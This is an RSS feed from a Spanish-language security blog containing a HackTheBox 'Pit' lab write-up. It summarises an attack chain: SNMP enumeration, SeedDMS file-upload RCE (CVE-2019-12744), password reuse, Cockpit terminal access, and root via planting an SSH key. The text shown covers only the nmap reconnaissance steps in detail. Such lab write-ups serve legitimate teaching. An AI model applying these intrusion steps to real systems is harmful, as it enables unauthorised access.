<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sh0x blog</title>
    <description>Every day you learn something new</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Tue, 31 May 2022 10:22:44 -0700</pubDate>
    <lastBuildDate>Tue, 31 May 2022 10:22:44 -0700</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>HackTheBox - Pit</title>
        <description>&lt;p&gt;M√°quina Linux (&lt;strong&gt;CentOS 8&lt;/strong&gt;) nivel medio. &lt;u&gt;Caminaremos&lt;/u&gt; con el servicio &lt;strong&gt;SNMP&lt;/strong&gt;, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos &lt;strong&gt;SeedDMS&lt;/strong&gt; con un exploit que no deber√≠a servir contra esa versi√≥n (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts üòõ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346pitHTB.png&quot; alt=&quot;346pitHTB&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/159204&quot;&gt;polarbearer&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.hackthebox.eu/profile/125033&quot;&gt;GibParadox&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Jmmm, un completo descontrol esto e.e&lt;/p&gt;

&lt;p&gt;Empezaremos jugando con un puerto &lt;code&gt;UDP&lt;/code&gt; que tiene activo un servicio &lt;code&gt;SNMP&lt;/code&gt; para monitorear tareas del sistema. Movi√©ndonos mucho con herramientas como &lt;code&gt;snmpwalk&lt;/code&gt;, &lt;code&gt;snmp-check&lt;/code&gt; y &lt;code&gt;snmpbulkwalk&lt;/code&gt; lograremos encontrar una ruta de un servicio web, un usuario llamado &lt;code&gt;michelle&lt;/code&gt; y el llamado a un binario: &lt;code&gt;/usr/bin/monitor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Toqueteando la ruta web tendremos un &lt;strong&gt;software de gesti√≥n documental&lt;/strong&gt; (&lt;strong&gt;DMS&lt;/strong&gt;) llamado &lt;code&gt;SeedDMS&lt;/code&gt;, lograremos pasar el &lt;strong&gt;login&lt;/strong&gt; usando como contrase√±a y usuario: &lt;strong&gt;michelle&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Estando dentro &lt;u&gt;se nos indica&lt;/u&gt; que el servicio ha sido actualizado a la versi√≥n &lt;code&gt;5.1.15&lt;/code&gt; debido a los problemas de seguridad encontrados en la versi√≥n &lt;code&gt;5.1.10&lt;/code&gt;. Esto nos hace perder mucho tiempo, ya que finalmente logramos comprometer el &lt;strong&gt;DMS&lt;/strong&gt; con un exploit de la versi√≥n &lt;code&gt;5.1.10&lt;/code&gt;‚Ä¶ üòë&lt;/p&gt;

&lt;p&gt;El exploit nos permite subir un archivo &lt;code&gt;.php&lt;/code&gt; para ejecutar comandos en el sistema, lo ejecutaremos como el usuario &lt;strong&gt;nginx&lt;/strong&gt;. No podremos obtener una &lt;strong&gt;Reverse Shell&lt;/strong&gt;, pero podremos simular una &lt;strong&gt;Shell&lt;/strong&gt; (l√©ase bien el &lt;u&gt;simular&lt;/u&gt;), esto con un script que creamos:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py&quot;&gt;fakeSheedDMS.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Enumerando el sistema encontramos unas credenciales en un archivo llamado &lt;code&gt;settings.xml&lt;/code&gt;, esas credenciales corresponden a un usuario de la base de datos.&lt;/p&gt;

&lt;p&gt;Haciendo reutilizaci√≥n de contrase√±as y apoyados en nuestra enumeraci√≥n web, lograremos autenticarnos como &lt;strong&gt;michelle&lt;/strong&gt; (con la contrase√±a encontrada en &lt;code&gt;settings.xml&lt;/code&gt;) contra otro login, esta vez de un servidor &lt;strong&gt;CentOS 8&lt;/strong&gt; alojado en la web.&lt;/p&gt;

&lt;p&gt;Jugando con √©l veremos que existe un apartado llamado &lt;strong&gt;Terminal&lt;/strong&gt; y si, en √©l podremos ejecutar comandos como &lt;strong&gt;michelle&lt;/strong&gt; en el sistema.&lt;/p&gt;

&lt;p&gt;Finalmente con ayuda de lo que encontramos con &lt;code&gt;snmp...&lt;/code&gt; recordaremos el binario &lt;code&gt;/usr/bin/monitor&lt;/code&gt;, lo inspeccionaremos y veremos que lo √∫nico que hace es ejecutar los archivos que sus nombres empiecen con &lt;strong&gt;check&lt;/strong&gt; y terminen en &lt;strong&gt;sh&lt;/strong&gt; (b√°sicamente un script de bash, ejemplo: &lt;code&gt;checkealorey.sh&lt;/code&gt;) &lt;strong&gt;&lt;u&gt;alojados en la ruta&lt;/u&gt; &lt;code&gt;/usr/local/monitoring&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Pero para que sea ejecutado debemos volver a validar nuestros procesos, o sea, ejecutar &lt;code&gt;snmpwalk&lt;/code&gt; o &lt;code&gt;snmpbulkwalk&lt;/code&gt; y que √©l sea el encargado de lanzar &lt;code&gt;/usr/bin/monitor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En el script le indicaremos que guarde nuestra llave &lt;strong&gt;SSH&lt;/strong&gt; publica en &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;, as√≠ jugando con nuestra llave privada lograremos tener acceso a la m√°quina como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346rating.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 20%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Muuuuy juguetona (poco real), pero vamos a tener que mover muchas cosas y enumerar como dioses.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Bueno, se vienen cositas‚Ä¶&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Encontrando puertos abiertos de la m√°quina con ayuda de &lt;strong&gt;nmap&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Enumerando servidor web (puerto 80)&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-9090&quot;&gt;Recorremos servicio sobre el puerto 9090&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#movimiento-lateral-dms&quot;&gt;Movimiento lateral - Encontramos ruta web al DMS (SeedDMS)&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#expl_seeddms&quot;&gt;Ejecuci√≥n remota de comandos en &lt;strong&gt;SeedDMS&lt;/strong&gt; (&lt;strong&gt;CVE-2019-12744&lt;/strong&gt;)&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#expl_settingsXML&quot;&gt;Encontramos credenciales de la base de datos en el archivo &lt;strong&gt;settings.xml&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#expl_centos_login_done&quot;&gt;Movimiento lateral - Ejecuci√≥n de comandos servidor &lt;strong&gt;CentOS&lt;/strong&gt; con interfaz web&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#privesc_scriptcheck&quot;&gt;Generamos script que ser√° ejecutado por &lt;strong&gt;/usr/bin/monitor&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Encontrando puertos abiertos de la m√°quina con ayuda de &lt;strong&gt;nmap&lt;/strong&gt; &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Empezaremos enumerando los puertos (servicios) abiertos de la m√°quina, lo haremos usando &lt;strong&gt;nmap&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.241 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar la &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; creada por &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Pero este escaneo va demasiado lento, entonces aprovechemos el uso de &lt;code&gt;--min-rate&lt;/code&gt; para indicarle que no env√≠e menos de X paquetes en cada petici√≥n, en nuestro caso &lt;strong&gt;1000&lt;/strong&gt; paquetes por petici√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open --min-rate=1000 -v 10.10.10.241 -oG initScan
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Este va muy bien y finalmente nos devuelve:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat initScan
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p- --open --min-rate=1000 -v -oG initScan 10.10.10.241
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.241 ()	Status: Up
Host: 10.10.10.241 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9090/open/tcp//zeus-admin///	Ignored State: filtered (65532)
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 350.43 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.hackingarticles.in/ssh-penetration-testing-port-22/&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Nos permite entre varias cosas conseguir una Shell de manera segura.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Nos provee de un servidor web.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9090&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Zeus_Web_Server&quot;&gt;zeus-admin&lt;/a&gt;&lt;/strong&gt;: Al parecer es una web para el control de ordenadores remotamente. Medio raro‚Ä¶&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Teniendo los puertos que est√°n abiertos, haremos un escaneo de versiones y scripts relacionados con cada servicio, as√≠ tendremos info un poco m√°s detallada:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;~(Usando la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (en este caso dar√≠a igual, ya que son poquitos, pero bueno, si fueran varios puertos es muy funcional)&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.241
    [*] Open ports: 22,80,9090

[*] Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;)~&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 22,80,9090 -sC -sV 10.10.10.241 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Y obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat portScan
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p 22,80,9090 -sC -sV -oN portScan 10.10.10.241
Nmap scan report for 10.10.10.241
Host is up (0.11s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     &amp;lt;!DOCTYPE html&amp;gt;
|     &amp;lt;html&amp;gt;
|     &amp;lt;head&amp;gt;
|     &amp;lt;title&amp;gt;
|     request
|     &amp;lt;/title&amp;gt;
|     &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
|     &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;
|     &amp;lt;style&amp;gt;
|     body {
|     margin: 0;
|     font-family: &quot;RedHatDisplay&quot;, &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.80%T=SSL%I=7%D=6/25%Time=60D65434%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,E70,&quot;HTTP/1...Content-Type:
...
x2010p&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos destacar cositas:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 8.0 (protocol 2.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;nginx 1.14.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;9090&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;nmap&lt;/strong&gt; no sabe si realmente es &lt;strong&gt;zeus-admin&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Vemos un dominio en el certificado:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;dms-pit.htb&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo podemos tener en cuenta por si algo.&lt;/p&gt;

&lt;p&gt;Por ahora nada m√°s :) Pues juguemos y encontremos la forma de explotar esta m√°quina.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80.png&quot; alt=&quot;346page80&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La p√°gina por default de &lt;a href=&quot;https://kinsta.com/es/base-de-conocimiento/que-es-nginx/&quot;&gt;nginx&lt;/a&gt; en &lt;a href=&quot;https://www.redhat.com/es/technologies/linux-platforms/enterprise-linux&quot;&gt;Red Hat&lt;/a&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Fuzzeando archivos o subdominios no encontramos nada interesante en ella y la versi√≥n de &lt;strong&gt;nginx&lt;/strong&gt; (&lt;code&gt;1.14.1&lt;/code&gt;) no nos proporciona tampoco nada relevante.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-9090&quot;&gt;Puerto 9090 &lt;a href=&quot;#puerto-9090&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090.png&quot; alt=&quot;346page9090&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un login de &lt;strong&gt;CentOS&lt;/strong&gt;‚Ä¶ En la parte de abajo vemos que hace referencia al dominio &lt;code&gt;pit.htb&lt;/code&gt;, as√≠ que agreguemos este y el que encontramos con &lt;strong&gt;nmap&lt;/strong&gt; al archivo &lt;a href=&quot;https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html&quot;&gt;/etc/hosts&lt;/a&gt;, pueda que consigamos que la m√°quina responda diferente ante los dominios:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat /etc/hosts
...
10.10.10.241  pit.htb dms-pit.htb
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero obtenemos las mismas respuestas (:&lt;/p&gt;

&lt;p&gt;Interceptando una petici√≥n con &lt;a href=&quot;https://openwebinars.net/blog/hacer-testeo-con-burp-suite/&quot;&gt;BurpSuite&lt;/a&gt; al intentarnos logear vemos algo llamativo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346burp_login9090.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo llamado &lt;strong&gt;cockpit&lt;/strong&gt; que curiosamente tiene una parte del nombre de la m√°quina, as√≠ que de una me llamo la atenci√≥n‚Ä¶&lt;/p&gt;

&lt;p&gt;Buscando en internet encontramos:&lt;/p&gt;

&lt;p&gt;üåê &lt;strong&gt;&lt;em&gt;&lt;u&gt;Cockpit&lt;/u&gt; is a web-based graphical interface for servers.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://cockpit-project.org/&quot;&gt;cockpit-project.org&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitProject.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfecto e interesante, ya que tenemos un login al parecer de un &lt;strong&gt;&lt;u&gt;server&lt;/u&gt; CentOS&lt;/strong&gt; (toma sentido).&lt;/p&gt;

&lt;p&gt;Y confirmamos que estamos relacionados con &lt;strong&gt;cockpit&lt;/strong&gt; gracias a una de sus im√°genes de ejemplo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitLogin.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listones, pues veamos como entrarle e.e&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s de algunas horitas de enumerar y enumerar y dejar de enumerar pensando por donde ir y volver a enumerar y volver a perderme llegue a la conclusi√≥n que no sab√≠a hacia donde tirar üòÑ&lt;/p&gt;

&lt;p&gt;Intente de todo con el CVE &lt;a href=&quot;https://security.archlinux.org/CVE-2020-35850&quot;&gt;&lt;strong&gt;CVE-2020-35850&lt;/strong&gt;&lt;/a&gt;, ve√≠a cositas pero nanai‚Ä¶ Estaba muy perdido, as√≠ que decid√≠ buscar ayuda y fue bastante clara (a veces nos centramos tanto en algo que olvidamos cositas muuuy sencillas):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;UDP.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y s√≠, podemos probar a hacer un escaneo de puertos &lt;a href=&quot;https://es.wikipedia.org/wiki/Protocolo_de_datagramas_de_usuario&quot;&gt;&lt;strong&gt;UDP&lt;/strong&gt;&lt;/a&gt; con &lt;strong&gt;nmap&lt;/strong&gt;, esto se lo indicamos con el par√°metro &lt;code&gt;-sU&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -sU -p- --open --min-rate=2000 -v 10.10.10.241 -oG initScanUDP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de un rato obtenemos un nuevo puerto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat initScanUDP 
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -sU -p- --open --min-rate=2000 -v -oG initScanUDP 10.10.10.241
# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.241 (pit.htb)    Status: Up
Host: 10.10.10.241 (pit.htb)    Ports: 161/open/udp//snmp///
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 370.61 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, encontramos un puerto que esta corriendo el servicio &lt;a href=&quot;https://www.manageengine.com/es/network-monitoring/what-is-snmp.html&quot;&gt;SNMP (Protocolo simple de administraci√≥n de red)&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;üü• &lt;strong&gt;&lt;em&gt;Facilita la administraci√≥n de dispositivos de una red&lt;/em&gt;&lt;/strong&gt;. &lt;a href=&quot;https://es.wikipedia.org/wiki/Protocolo_simple_de_administraci%C3%B3n_de_red&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Listones, ahora tomemos ese puerto y veamos que versi√≥n esta ejecutando y si tiene scripts relacionados:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -sU -p 161 -sC -sV 10.10.10.241 -oN portScanUPD
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos devuelve:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Fri Jun 25 21:38:44 2021 as: nmap -sU -p 161 -sC -sV -oN portScanUDP 10.10.10.241
Nmap scan report for pit.htb (10.10.10.241)
Host is up (0.11s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 4ca7e41263c5985e00000000
|   snmpEngineBoots: 71
|_  snmpEngineTime: 5h48m16s
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /usr/lib/systemd/systemd
|     Params: --switched-root --system --deserialize 18
...
...
# Es gigante el output.
